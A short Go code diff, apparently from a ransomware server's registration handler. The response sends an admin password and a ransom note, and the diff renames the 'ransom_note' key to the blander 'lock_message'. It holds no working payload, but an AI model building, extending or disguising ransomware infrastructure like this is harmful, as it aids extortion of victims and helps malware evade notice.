@@ -212,7 +212,7 @@ func handleRegister(w http.ResponseWriter, r *http.Request) {
 		"status": "registered",
 		"config": map[string]string{
 			"admin_password": getAdminPassword(),
-			"ransom_note":    getRansomNote(),
+			"lock_message":   getRansomNote(),
 		},
 	})
 }
